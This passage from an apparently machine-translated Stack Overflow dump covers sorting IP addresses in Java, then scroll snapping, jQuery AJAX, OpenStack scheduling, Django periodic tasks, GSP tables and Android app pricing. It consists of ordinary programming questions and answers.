        for(BigInteger bI:tempBigIntList)
        {
            bigInt32Bit = bigInt32Bit.add(bI);
        }
        return bigInt32Bit;
    }

    public void sort128BitIPs(ArrayList<String> bit128,ArrayList<String> newBit128)
    {
        ArrayList<BigInteger> bigInt128Bit = new ArrayList<BigInteger>();
        for(String ip:bit128)
        {
            String[] tempArray = ip.split(":");
            int i=0;
            for(String s:tempArray)
            {
                if(s.equals(""))
                {
                    tempArray[i]="0";
                }
                i++;
            }
            bigInt128Bit.add(convert128Bit(tempArray));
        }

        Collections.sort(bigInt128Bit);

        for(BigInteger finalValue:bigInt128Bit)
        {
            for(String ip:bit128)
            {
                String[] tempArray = ip.split(":");
                int i=0;
                for(String s:tempArray)
                {
                    if(s.equals(""))
                    {
                        tempArray[i]="0";
                    }
                    i++;
                }
                if(finalValue.equals(convert128Bit(tempArray)))
                {
                    if(!newBit128.contains(ip))
                    {
                        String str = bit128.toString();
                        String findStr = ip;
                        int lastIndex = 0;
                        int count = 0;

                        while(lastIndex != -1){

                            lastIndex = str.indexOf(findStr,lastIndex);

                            if(lastIndex != -1){
                                count++;
                                lastIndex += findStr.length();
                            }
                        }

                        for(int k = 0; k<count;k++)
                        {
                            newBit128.add(ip);
                        }
                    }
                }
            }
        }
    }

    BigInteger convert128Bit(String[] array)
    {
        int[] tempArray = new int[array.length];
        ArrayList<BigInteger> tempBigIntList = new ArrayList<BigInteger>();
        int i = 0;
        for(String s:array)
        {
            int power = 8-i;
            tempArray[i]= Integer.parseInt(s,16);
            String string = Integer.toString(tempArray[i]);
            BigInteger myBigInt = new BigInteger(string);
            BigInteger num2 = myBigInt.multiply(new BigInteger("65536").pow(power));
            tempBigIntList.add(num2);
            i++;
        }
        BigInteger bigInt128Bit = new BigInteger("0");
        for(BigInteger bI:tempBigIntList)
        {
            bigInt128Bit = bigInt128Bit.add(bI);
        }
        return bigInt128Bit;
    }

    public void printInOrder(ArrayList<String> bit32,ArrayList<String> bit128)
    {
        System.out.println("\nSorted IPs");

        System.out.println("Sorted 32 bit IPs - Ascending");
        for(String ip: bit32)
        {
            System.out.println("  "+ip);
        }

        Collections.reverse(bit32);
        System.out.println("\nSorted 32 bit IPs - Descending");
        for(String ip: bit32)
        {
            System.out.println("  "+ip);
        }

        System.out.println("\nSorted 128 bit IPs - Ascending");
        for(String ip: bit128)
        {
            System.out.println("  "+ip);
        }

        Collections.reverse(bit128);
        System.out.println("\nSorted 128 bit IPs - Descending");
        for(String ip: bit128)
        {
            System.out.println("  "+ip);
        }
    }

    public void run(ArrayList<String> bit32,ArrayList<String> bit128,ArrayList<String> newBit32,ArrayList<String> newBit128)
    {
        sortIntoRespectiveIPTypes();
        sort32BitIPs(bit32,newBit32);
        sort128BitIPs(bit128,newBit128);
        printInOrder(newBit32,newBit128);
    }

    public static void main(String[] args)
    {
        IPSort ipS = new IPSort();
        ipS.run(ipS.bit32,ipS.bit128,ipS.cleanBit32,ipS.cleanBit128);
    }
} 
```

*请注意，可以使用[此类](https://docs.oracle.com/javase/8/docs/api/java/net/InetAddress.html)对 IP 进行排序，但我的代码不使用它*

*此代码还将列表按升序排序，然后按降序排序。当代码运行时，这会在命令控制台中打印出来*

**输出**

[![输出](../Images/4b79f8a4efd136b4ea75a7d34cd3ee15.png)](https://i.stack.imgur.com/JutJ3.png)

**编辑**

一种更有效和更准确的方法是使用上面提到的[`InetAddress`类](https://docs.oracle.com/javase/8/docs/api/java/net/InetAddress.html)。[归功于 200_success](https://stackoverflow.com/users/1157100/200-success)的代码。

```
import java.net.InetAddress;
import java.net.Inet4Address;
import java.net.Inet6Address;
import java.net.UnknownHostException;
import java.util.Arrays;
import java.util.Collections;
import java.util.Comparator;
import java.util.Optional;
import java.util.stream.Stream;

public class IPSort {
    private static String[] TESTS = {"0:0:0:0:0:0:fff:ffff","::FFFF:222.1.41.90",":8:","::::5:6::8","::::5:6::7","::::5:6::8","123..245.23","1...","..1.","123...23",".1..","123..245.23", "123..245.23", "104.244.253.29", "1.198.3.93", "32.183.93.40", "32.183.93.40", "104.30.244.2", "104.244.4.1","0.0.0.1",":a:","::5:3:4:5:6:78","1::2:3","1::2:3:4","1::5:256.2.3.4","1:1:3000.30.30.30","ae80::217:f2ff:254:7:237:98","::2:3:4:5:6:7","2:3:4:5:6:7","::5:3:4:5:6:7:8","::5:3:4:5:6:7:8:9:0","1::8","1::2:3","1::2:3:4","1::5:256.2.3.4","1:1:3000.30.30.30","ae80::217:f2ff:254.7.237.98","1:2:3:4::5:1.2.3.4","2001:0000:1234:0000:0000:C1C0:ABCD:0876","12345::6:7:8","1::1.2.900.4","fe80::","::ffff:0:0"};

    public static class InetAddressComparator implements Comparator<InetAddress> {
        @Override
        public int compare(InetAddress a, InetAddress b) {
            byte[] aOctets = a.getAddress(),
                   bOctets = b.getAddress();
            int len = Math.max(aOctets.length, bOctets.length);
            for (int i = 0; i < len; i++) {
                byte aOctet = (i >= len - aOctets.length) ?
                    aOctets[i - (len - aOctets.length)] : 0;
                byte bOctet = (i >= len - bOctets.length) ?
                    bOctets[i - (len - bOctets.length)] : 0;
                if (aOctet != bOctet) return (0xff & aOctet) - (0xff & bOctet);
            }
            return 0;
        }
    }

    public static Optional<InetAddress> toInetAddress(String s) {
        try {
            return Optional.of(InetAddress.getByName(s));
        } catch (UnknownHostException badAddress) {
            return Optional.empty();
        }
    }

    public static void main(String[] args) throws Exception {
        System.out.println("Valid 32-bit addresses");
        Arrays.stream(TESTS)
              .map(IPSort::toInetAddress)
              .filter(Optional::isPresent)
              .map(Optional::get)
              .filter((addr) -> addr instanceof Inet4Address)
              .map(InetAddress::getHostAddress)
              .forEach(System.out::println);

        System.out.println("\nValid 128-bit addresses");
        Arrays.stream(TESTS)
              .map(IPSort::toInetAddress)
              .filter(Optional::isPresent)
              .map(Optional::get)
              .filter((addr) -> addr instanceof Inet6Address)
              .map(InetAddress::getHostAddress)
              .forEach(System.out::println);

        System.out.println("\nInvalid addresses");
        Arrays.stream(TESTS)
              .filter((s) -> !toInetAddress(s).isPresent())
              .forEach(System.out::println);

        System.out.println("\nSorted addresses");
        Arrays.stream(TESTS)
              .map(IPSort::toInetAddress)
              .filter(Optional::isPresent)
              .map(Optional::get)
              .sorted(new InetAddressComparator())
              .map(InetAddress::getHostAddress)
              .forEach(System.out::println);
    }
} 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-12-07T03:00:56.843

我建议实现你自己的比较器。请参阅这篇文章：[在 Java 中对 IP 地址进行排序](http://thilosdevblog.wordpress.com/2010/09/15/sorting-ip-addresses-in-java/)

仅为您复制粘贴：

```
/**
 * LGPL
 */
public class InetAddressComparator implements Comparator {
    @Override
    public int compare(InetAddress adr1, InetAddress adr2) {
        byte[] ba1 = adr1.getAddress();
        byte[] ba2 = adr2.getAddress();

        // general ordering: ipv4 before ipv6
        if(ba1.length < ba2.length) return -1;
        if(ba1.length > ba2.length) return 1;

        // we have 2 ips of the same type, so we have to compare each byte
        for(int i = 0; i < ba1.length; i++) {
            int b1 = unsignedByteToInt(ba1[i]);
            int b2 = unsignedByteToInt(ba2[i]);
            if(b1 == b2)
                continue;
            if(b1 < b2)
                return -1;
            else
                return 1;
        }
        return 0;
    }

    private int unsignedByteToInt(byte b) {
        return (int) b & 0xFF;
    }
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-07T03:01:57.530

对于您显示的 ip4 地址，您只需将其拆分即可。然后我会将其转换为长值，并按此排序。

```
long value = f3 + f2*256 + f1 * 256^2 + f0 * 256^3 
```

其中 f0 - f3 是拆分后的值。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-12-07T03:10:06.630

将每个片段填充`IP`到长度`3`，然后`sort`如下所示：

```
 List<String> ipList = new ArrayList<String>();
    ipList.add("123.4.245.23");
    ipList.add("104.244.253.29");
    ipList.add("1.198.3.93");
    ipList.add("32.183.93.40");
    ipList.add("104.30.244.2");
    ipList.add("104.244.4.1");
    Collections.sort(ipList, new Comparator<String>() {
        @Override
        public int compare(String o1, String o2) {
            String[] ips1 = o1.split("\\.");
            String updatedIp1 = String.format("%3s.%3s.%3s.%3s",
                                                  ips1[0],ips1[1],ips1[2],ips1[3]);
            String[] ips2 = o2.split("\\.");
            String updatedIp2 = String.format("%3s.%3s.%3s.%3s",
                                                  ips2[0],ips2[1],ips2[2],ips2[3]);
            return updatedIp1.compareTo(updatedIp2);
        }
    });
    //print the sorted IP
    for(String ip: ipList){
        System.out.println(ip);
    } 
```

* * *

它打印：

> 1.198.3.93
> 32.183.93.40
> 104.30.244.2
> 104.244.4.1
> 104.244.253.29
> 123.4.245.23

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-10-23T03:57:29.553

```
public class IpSort {  
    public static void main(String[] args) {  
        // TODO Auto-generated method stub  
        String[] arr = {"192.168.1.1",  
            "191.122.123.112",  
            "192.161.1.1",  
            "191.122.123.1",  
            "123.24.5.78",  
            "121.24.5.78",  
            "123.24.4.78",  
            "123.2.5.78",  
            "192.1.1.1",  
            "125.45.67.89",  
            "1.1.1.1",  
            "3.4.5.6",  
            "2.2.2.2",  
            "6.6.6.7",  
            "155.155.23.0"};  
        String tmp;  
        for(int i=0;i<arr.length;i++)  
        {  
                  for(int j=1;j<arr.length-i;j++)  
                  {  
                      String[] instr1 = arr[j-1].split("\\.");  
                      String[] instr2 = arr[j].split("\\.");  
                           if(Integer.parseInt(instr1[0]) > Integer.parseInt(instr2[0]))  
                           {  
                               tmp=arr[j-1];  
                               arr[j-1]=arr[j];  
                               arr[j]=tmp;  
                           }else if(Integer.parseInt(instr1[0]) == Integer.parseInt(instr2[0])  
                         && Integer.parseInt(instr1[1]) > Integer.parseInt(instr2[1]) )  
                           {  
                                tmp=arr[j-1];  
                                arr[j-1]=arr[j];  
                                arr[j]=tmp;  
                           } else if(Integer.parseInt(instr1[0]) == Integer.parseInt(instr2[0])  
                         && Integer.parseInt(instr1[1]) == Integer.parseInt(instr2[1])  
                         && Integer.parseInt(instr1[2]) > Integer.parseInt(instr2[2]) )  
                           {  
                                tmp=arr[j-1];  
                                arr[j-1]=arr[j];  
                                arr[j]=tmp;  
                           } else if(Integer.parseInt(instr1[0]) == Integer.parseInt(instr2[0])  
                         && Integer.parseInt(instr1[1]) == Integer.parseInt(instr2[1])  
                         && Integer.parseInt(instr1[2]) == Integer.parseInt(instr2[2])  
                         && Integer.parseInt(instr1[3]) > Integer.parseInt(instr2[3]) )  
                           {  
                               tmp=arr[j-1];  
                               arr[j-1]=arr[j];  
                               arr[j]=tmp;  
                           }  
                  }  

        }  
        System.out.println("final sorted list of ips :\n");  
        for(int k=0;k<arr.length;k++){  
            System.out.println(arr[k]);  
        }  
    }  
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2017-11-18T01:03:51.967

在 Java8 中

```
import java.math.BigInteger;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.AbstractMap;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Map;

class Test {
    private static final Comparator<InetAddress> COMPARATOR = Comparator
            .comparing(InetAddress::getAddress,
                    Comparator.comparingInt((byte[] b) -> b.length)
                    .thenComparing(b -> new BigInteger(1, b)));

    public static void main(String[] args) {
        final String[] addresses = {
                "123.4.245.23",
                "104.244.253.29",
                "1.198.3.93",
                "32.183.93.40",
                "104.30.244.2",
                "104.244.4.1"
        };

        for (final String address : sort(addresses)) {
            System.out.println(address);
        }
    }

    public static String[] sort(final String[] addresses) {
        return Arrays.stream(addresses)
                .map(s -> new AbstractMap.SimpleImmutableEntry<>(toInetAddress(s), s))
                .sorted(Comparator.comparing(Map.Entry::getKey, Comparator.nullsLast(COMPARATOR)))
                .map(Map.Entry::getValue)
                .toArray(String[]::new);
    }

    private static InetAddress toInetAddress(final String address) {
        try {
            return InetAddress.getByName(address);
        } catch (final UnknownHostException | SecurityException e) {
            e.printStackTrace();
            return null;
        }
    }
} 
```

输出：

```
1.198.3.93
32.183.93.40
104.30.244.2
104.244.4.1
104.244.253.29
123.4.245.23

```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2017-08-06T16:13:18.803

```
public class SortIP
{

    public static String getFormattedIP(String ip)
    {
        String arg[] = new String[4];
        arg = (ip).split("\\.");

        int i=0;
        while(i<=3)
        {
            if(arg[i].length()==1)
            {
                arg[i]="00"+arg[i];
            }
            else if(arg[i].length()==2)
            {
                arg[i]="0"+arg[i];
            }

            i++;
        }

        return arg[0]+arg[1]+arg[2]+arg[3];
    }

    public static ArrayList<Integer> sortedList(Object[] obj,String order)
    {
        if(order.equalsIgnoreCase("Ascending"))
        {
            Arrays.sort(obj, new Comparator() {
                public int compare(Object o1, Object o2) {
                    return ((Map.Entry<Integer, Long>) o1).getValue()
                               .compareTo(((Map.Entry<Integer, Long>) o2).getValue());
                }
            });
        }
        else
        {
            Arrays.sort(obj, new Comparator() {
                public int compare(Object o1, Object o2) {
                    return ((Map.Entry<Integer, Long>) o2).getValue()
                               .compareTo(((Map.Entry<Integer, Long>) o1).getValue());
                }
            });
        }

        int counter=0;
        ArrayList<Integer> key = new ArrayList<Integer>();
        //int key[] = new int[ipRange.size()];

        for (Object e : obj) {
            key.add(((Map.Entry<Integer, Long>) e).getKey());
            //key[counter++]=((Map.Entry<Integer, Long>) e).getKey();

            System.out.println(((Map.Entry<Integer, Long>) e).getKey() + " : " + ((Map.Entry<Integer, Long>) e).getValue());
        }

        return key;
    }

    public static void main(String[] args) 
    {
        Map<Integer,String> ipRange= new TreeMap<Integer,String>();
        Map<Integer,Long> formatedIpRange= new TreeMap<Integer,Long>();

        ipRange.put(1, "10.1.4.100");
        ipRange.put(2, "1.10.400.10");
        ipRange.put(3, "196.0.14.15");
        ipRange.put(4, "196.70.5.1");
        ipRange.put(5, "196.70.7.3");
        ipRange.put(6, "153.70.7.0");

        for(int j=1;j<=ipRange.size();j++)
        {
            formatedIpRange.put(j, Long.parseLong(getFormattedIP(ipRange.get(j))));
        }

        Object[] a = formatedIpRange.entrySet().toArray();

        ArrayList<Integer> key = sortedList(a,"descending");

        System.out.println("ordered list ");

        for (Integer integer : key) 
        {
            System.out.println(ipRange.get(integer));
        }
    }
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2020-03-28T06:04:29.383

试试这个

```
@Override
public int compare(Object adr1, Object adr2) {
    try
    {
        if(adr1 == null || adr1.toString().isEmpty()) return -1;
        if(adr2 == null || adr2.toString().isEmpty()) return 1;
        String[] ba1 = adr1.toString().split( "\\." );
        String[] ba2 = adr2.toString().split( "\\." );

        for ( int i = 0; i < ba1.length; i++ )
        {
            int b1 = Integer.parseInt( ba1[ i ] );
            int b2 = Integer.parseInt( ba2[ i ] );

            if (b1 == b2)
                continue;
            if (b1 < b2)
                return -1;
            else
                return 1;
        }
        return 0;
    }
    catch ( Exception ex )
    {
        return 0;
    }

} 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2016-12-15T12:15:22.977

这个简单的逻辑怎么样：

IP 地址：[10.1.1.2, 10.22.33.11, 10.12.23.12]

1) 填写IP完成12位前缀0的格式：如[010.001.001.002, 010.022.033.011, 010.012.023,012]

2) 去掉“.”，使其成为完整的数字字符串：[010001001002, 010022033011, 010012023012]

3) 应用排序 [010001001002, 010012023012, 010022033011]

4）每3位后保留点：[010.001.001.002, 010.012.023.012, 010.022.033.011]

5) 删除前缀 0 的 [10.1.1.2, 10.12.23.12, 10.22.33.11]

6）排序！

# javascript - 如何“捕捉”滚动到最近的预定义位置？

> ID：13756236
> 
> 赞同：4
> 
> 时间：2012-12-07T02:52:00.577
> 
> 标签：javascript, jquery, scroll

我有一个网站，基本上是四个 div - 每个都设置为窗口的高度，因此总文档是窗口高度的四倍。

这个想法是单击 div 将滚动推进一个“窗口高度” - 这很好，如下所示：

```
// on click event

if(cur_frame<number_slides){
   scrolling = true;
   $('html,body').animate({scrollTop:window_height*cur_frame},function(){
      scrolling=false;
   });
} 
```

但是，在用户手动滚动页面后，我想将位置“捕捉”到最接近的窗口高度倍数 - 所以给定的 div 再次在屏幕上居中。我尝试使用超时，认为一个小的延迟会阻止它每秒触发一千次......

```
// on scroll event

clearTimeout(scroll_timer);
if(!scrolling) scroll_timer = setTimeout(function(){
   if(cur_scroll!=window_height*(cur_frame-1)) {
      scrolling = true;
      $('html,body').stop().animate({scrollTop:window_height*(cur_frame-1)},function(){
         scrolling = false;
      });
   }
},100); //20? 400? 1000? 
```

...但是无法在脚本与用户在滚动位置上的争斗或严重的长时间延迟之间取得平衡，从而破坏了“捕捉”效果。

有什么建议可以如何实现？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-11-07T20:08:58.617

用于此的 jquery scrollsnap 插件支持到 IE9。

您正在寻找的内容称为“Scroll Snap”。

```
<script src="demo/foundation/javascripts/jquery.js"></script>
<script src="src/jquery.event.special.js"></script>
<script src="src/jquery.easing.min.js"></script>
<script src="src/jquery.scrollsnap.js"></script>
<script type="text/javascript">
$(document).ready(function() {
    $(document).scrollsnap({
        snaps: '.snap',
        proximity: 50
    });
});
</script> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2017-06-27T16:23:36.630

有一个 CSS 规范，它很好地支持原生渲染和非常好的触摸行为，除了 Chrome：[http ://caniuse.com/#feat=css-snappoints](http://caniuse.com/#feat=css-snappoints)

对于落后的浏览器，有一个 polypill：[https ://github.com/ckrack/scrollsnap-polyfill](https://github.com/ckrack/scrollsnap-polyfill)

另请参阅[如何在 Chrome 中模拟 CSS 滚动捕捉点？](https://stackoverflow.com/questions/31245252/how-to-emulate-css-scroll-snap-points-in-chrome#33149981)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-02-09T09:01:06.797

如果您想考虑跨浏览器 javascript 重新实现原生 CSS **Scroll Snap**规范，这里已经回答：[如何在 Chrome 中模拟 CSS Scroll Snap Points？](https://stackoverflow.com/questions/31245252/how-to-emulate-css-scroll-snap-points-in-chrome/48683041#48683041)，你可以使用 **[这个库](https://github.com/lucafalasco/scroll-snap)**：

使用它而不是原生 css 解决方案的主要原因是它适用于所有现代浏览器，并且具有可自定义的配置，以允许在转换和滚动检测中自定义时间。

该库使用 vanilla javascript 缓动函数重新实现 css 捕捉功能，并使用容器元素的`scrollTop`/`scrollLeft`属性和*滚动*事件侦听器的值工作

这是一个显示如何使用它的示例：

```
import createScrollSnap from 'scroll-snap'

const element = document.getElementById('container')

const { bind, unbind } = createScrollSnap(element, {
  snapDestinationX: '0%',
  snapDestinationY: '90%',
  timeout: 100,
  duration: 300,
  threshold: 0.2,
  snapStop: false,
  easing: easeInOutQuad,
}, () => console.log('snapped'))

// remove the listener 
// unbind();

// re-instantiate the listener 
// bind(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-11-29T12:48:49.853

使用简单的怎么样`scrollTo`？使用纯 Javascript 和 CSS，没有框架或库。

这里有两个例子，一个用于垂直滚动，另一个用于水平滚动：

*   垂直：[https ://jsfiddle.net/x9z5tpye/](https://jsfiddle.net/x9z5tpye/)
*   横向：[https ://jsfiddle.net/bwsyn6q4/](https://jsfiddle.net/bwsyn6q4/)

最好
的 Unkn0wn0x

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-12-07T05:30:18.763

您可以使用 javascript 来执行此操作，或者对于稍微简单和较旧的解决方案，您可以使用页面锚点。如果您将 document.location.hash 更改为页面中存在的锚点，则浏览器将滚动到它。因此，在您的 HTML 中，在页面中放置一些锚点：

```
<a name="anchor1" id="anchor1"></a> 
```

然后在你的js中放：

```
document.location.hash = "anchor1"; 
```

# php - 打开第 1 页后，jquery/ajax 不会导航到第 2 页

> ID：13756237
> 
> 赞同：0
> 
> 时间：2012-12-07T02:52:02.683
> 
> 标签：php, jquery, html, ajax

我在下面有一个 jquery 代码，它显示在`editsessionadmin.php`页面中。现在假设发生的是，当打开此页面时，将执行 jquery/ajax 功能，以便导航到`module.php`页面以便能够从查询中选择模块列表，将每个模块显示为选项并在页面的模块下拉菜单中显示这些选项`editsessionadmin.php`。

我的问题是它没有这样做。jquery/ajax 没有做任何事情，因为脚本中的 Module 下拉菜单`editsessionadmin.php`不包含除选项之外的任何`Please Select`选项。

有人知道如何修复 jquery/ajax 代码以执行我希望它执行的操作吗？

下面是`editsessionadmin.php`代码：

```
 <script type="text/javascript">

            $(document).ready( function(){
            function getModules() { 
            jQuery.ajax({ 
            type: "post", 
            url:  "module.php", 
            success: function(response){ 
            jQuery('#modulesDrop').append(response); 
            } 
            }); 
    });
            }
            </script>

....

<?php

    $moduleHTML = "";  
    $moduleHTML .= '<select name="modules" id="modulesDrop">'.PHP_EOL; 
    $moduleHTML .= '<option value="">Please Select</option>'.PHP_EOL;  
    $moduleHTML .= '</select>'; 

?> 
```

module.php 页面：

`

```
 // connect to the database
 include('connect.php');

 /* check connection */
 if (mysqli_connect_errno()) {
printf("Connect failed: %s\n", mysqli_connect_error());
die();
}

$moduleactive = 1;

$sql = "SELECT ModuleId, ModuleNo, ModuleName FROM Module WHERE ModuleActive = ? ORDER BY ModuleNo"; 

 $sqlstmt=$mysqli->prepare($sql);

 $sqlstmt->bind_param("i", $moduleactive);

 $sqlstmt->execute(); 

 $sqlstmt->bind_result($dbModuleId,$dbModuleNo,$dbModuleName);

$moduleHTML  = "";  

 while($sqlstmt->fetch()) { 
     $moduleHTML .= sprintf('<option value="%1$s_%2$s_%3$s">%1$s - %2$s</option>'.PHP_EOL, $dbModuleNo, $dbModuleName, $dbModuleId);
} 

echo $moduleHTML; 

 $sqlstmt->execute(); 

?>` 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T03:22:32.557

您的代码看起来像是在准备好文档时创建一个函数，但从未调用它。而且看起来你的括号有点乱。通过缩进代码，这变得更加明显。

```
$(document).ready( function(){
    function getModules() { 
        jQuery.ajax({ 
            type: "post", 
            url:  "module.php", 
            success: function(response){ 
                jQuery('#modulesDrop').append(response); 
            } 
        }); 
});
    } <--- This should be swapped with the line above 
```

您可以做的是删除最后的行`function getModules() {`和备用`}`，然后它应该可以工作或至少在 FireBug 中为您提供另一个 GET。

# javascript - 如何在不使用 cookie 的情况下使用 javascript 识别网页访问者？

> ID：13756243
> 
> 赞同：-4
> 
> 时间：2012-12-07T02:54:34.107
> 
> 标签：javascript

一段时间以来，我注意到网络上的一些广告与我感兴趣的内容极为相关。

我认为这可以通过 javascript 实现，因为即使我清理了计算机中的所有 cookie，情况也是一样的。

有人指出我正确的方向吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T02:57:02.827

有很多新的方法可以通过 javascript 和其他工具跟踪人们，[The Evercookie](http://samy.pl/evercookie/)基本上将所有这些方法总结为一个可怕的 cookie 噩梦。您还可以使用 javascript 查看 HTML5 的新本地存储。

# openstack - Openstack：如何决定硬件容量？

> ID：13756247
> 
> 赞同：1
> 
> 时间：2012-12-07T02:55:03.063
> 
> 标签：openstack, openstack-nova

我最近正在阅读一些 OpenStack 资料，但还没有机会尝试。我感觉到 Openstack 可以通过 API 或仪表板接口管理大量虚拟机。用户可以轻松创建/启动虚拟机。

然后我很困惑。由于底层计算机硬件可能会有所不同，某些计算机可能只能托管一台虚拟机，有些可能只有十台。当用户启动虚拟机时，是用户手动还是 Openstack 自动指定一台硬件计算机来托管虚拟机？无论哪种情况，如何确定硬件计算机的容量？Openstack是否提供设置硬件计算机容量属性的功能？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T14:06:52.193

当你运行 OpenStack 时，每台物理机（OpenStack 称为*计算主机*）会定期报告它有多少 CPU 和它有多少 RAM，以及有多少 CPU 和多少 RAM 已分配给当前正在运行的虚拟机.

OpenStack 调度程序使用此信息来确定在哪个计算主机上运行 VM。首先，它检查主机是否有足够的 CPU（通过应用[CoreFilter](http://docs.openstack.org/folsom/openstack-compute/admin/content/scheduler-filters.html#computefilter)）和足够的 RAM（通过应用[RamFilter](http://docs.openstack.org/folsom/openstack-compute/admin/content/scheduler-filters.html#computefilter)）。甚至不会考虑没有足够 CPU 或 RAM 可用的计算主机。

一旦它拥有一组具有足够 CPU 和 RAM 的候选主机，调度程序就需要从中挑选一个。默认情况下，调度程序将使用“传播优先”策略，将 VM 分配给当前未分配给 VM 的 CPU/RAM 数量最多的计算机。可以将此策略更改为“先填充”行为，以便首先分配具有最少可用资源的计算主机。这是通过设置 [nova.scheduler.least_cost.compute_fill_first_cost_fn](http://docs.openstack.org/folsom/openstack-compute/admin/content/compute_fill_first_cost_fn.html)参数来配置的。

有关更多信息，请参阅OpenStack Compute Admin 指南中的[调度章节。](http://docs.openstack.org/folsom/openstack-compute/admin/content/ch_scheduling.html)

# python - 运行定期任务

> ID：13756248
> 
> 赞同：4
> 
> 时间：2012-12-07T02:55:16.400
> 
> 标签：python, django

所以我有一个由 Django 提供支持的网页。我在数据库中有一堆用户，我想每 5 到 10 分钟对数据库中的每个用户运行一次特定任务。最好的方法是什么？一次最多可以有 1000 个用户。像[芹菜](http://celeryproject.org/)这样的东西对此有用吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T03:06:51.957

> 像芹菜这样的东西对这个有用吗

是的，Celery 带有内置的周期性任务：[Celery Beat](http://docs.celeryproject.org/en/latest/userguide/periodic-tasks.html)。

另一种选择是[PythonRQ](http://python-rq.org/)与[RQ Scheduler](https://github.com/ui/rq-scheduler)结合使用。这是我在最近的一个项目中使用的，我对此非常满意。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T02:58:44.577

我认为下面是你想要的

[http://code.google.com/p/django-cron/](http://code.google.com/p/django-cron/)

[Django - 设置计划作业？](https://stackoverflow.com/questions/573618/django-set-up-a-scheduled-job)

或者你只是在 linux 级别使用 cron

如何设置 cron 的详细指南：

[http://www.cyberciti.biz/faq/how-do-i-add-jobs-to-cron-under-linux-or-unix-oses/](http://www.cyberciti.biz/faq/how-do-i-add-jobs-to-cron-under-linux-or-unix-oses/)

linux中的cron作业将在预定义的时间间隔、分钟、每小时、每天、每周运行脚本

有关详细信息，您只需在 Linux 终端上键入“crontab -e”

```
crontab -e 
```

然后加起来一行（任务）

```
1 2 3 4 5 /path/to/command arg1 arg2 
```

1：分钟 (0-59) 2：小时 (0-23) 3：日 (0-31) 4：月 (0-12 [12 == 十二月]) 5：星期几(0-7 [7或 0 == sunday]) /path/to/command - 脚本或命令名称来安排

完成后，保存并退出。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-07T03:02:44.107

“Celery”让 Python 应用程序（如 Django）轻松运行后台进程。它实际上最初是专门为 Django 构建的。

[http://celeryproject.org/](http://celeryproject.org/)

他们的示例显示了一个简单的任务添加两个数字：

```
from celery.decorators import task

@task
def add(x, y):
    return x + y 
```

您可以在后台执行任务，或等待它完成：

```
>>> result = add.delay(8, 8)
>>> result.wait() # wait for and return the result
16 
```

以下是有关“cron”式计划任务的信息：http: [//docs.celeryproject.org/en/latest/reference/celery.schedules.html](http://docs.celeryproject.org/en/latest/reference/celery.schedules.html)

您可能还想安装[RabbitMQ](http://celeryq.org/docs/getting-started/broker-installation.html)以使其正常工作，因此它可能比您正在寻找的解决方案更复杂，但它会实现您的目标。如果您愿意（包括使用数据库本身）并且您了解限制，也可以使用更轻量级的方法来安装它。

# html - GSP中html表格的格式

> ID：13756250
> 
> 赞同：-1
> 
> 时间：2012-12-07T02:55:17.990
> 
> 标签：html, grails, html-table, gsp

我正在使用 Grails，我目前面临这个问题。

这是我的 html 表的结果 ![在此处输入图像描述](../Images/8c93791873c656fb27009507136b47f5.png)

这是我来自 gsp 页面的代码

```
 <tr>
        <th>Device ID</th>
        <th>Device Type</th>
        <th>Status</th>
        <th>Customer</th>   
    </tr>
<tr>
<g:each in = "${reqid}">
        <td>${it.device_id}</td>
</g:each>

<g:each in ="${custname}">
        <td>${it.type}</td>
        <td>${it.system_status}</td>
        <td>${it.username}</td>
</g:each>
    </tr> 
```

所以问题是，如何格式化表格以使“LHCT271 , 2 , Thomasyeo ”相应地向下移动？我试图在`<tr>`这里和那里添加标签，但它不起作用..有什么帮助吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T06:17:06.853

我认为您的问题不在视图中，而在控制器中（甚至可能在域中）。如果它们在同一个表中，您必须有某种方式知道`reqid`并且是相关的。`custname`您必须使用它来构造一个可以在 ag:each 中轻松使用的对象

您正在寻找一种混合列和行的方法，并且仍然可以获得一张漂亮的表格。恐怕这是不可能的。

**编辑**

（对不起，我刚看到最后一条评论。）

您不能在 ag:each 中混合两个项目。

此外，如果这两件事不相关，您可能不能将它们放在同一张表中。您或 Grails 将无法知道如何正确组织信息

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-08T15:20:29.303

您是否要针对第一个客户名称（三个字段）显示第一个要求，第二个反对第二个等等？这些集合的长度是否相同？

在这种情况下，您可以尝试以下方法：

```
<tr>
    <th>Device ID</th>
    <th>Device Type</th>
    <th>Status</th>
    <th>Customer</th>   
</tr>
<g:each var="req" in="${reqid}" status="i">
    <tr>
        <td>${req}</td>
        <td>${custname[i].type}</td>
        <td>${custname[i].system_status}</td>
        <td>${custname[i].username}</td>
    </tr>
</g:each> 
```

# android - Android - 有没有办法为用户创造折扣？

> ID：13756251
> 
> 赞同：0
> 
> 时间：2012-12-07T02:18:12.603
> 
> 标签：android

作为一名 Android 开发人员，我有一个付费应用，但我不知道如何为应用创建折扣。有没有办法做到这一点？

例如，我想将应用程序免费提供给我的朋友，但我不知道怎么做。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T03:10:11.400

不，在 android 中，如果你想免费提供给测试人员/朋友，你必须制作一个免费版本

# mysql - 我需要在mysql中使用索引json数据的列

> ID：13756253
> 
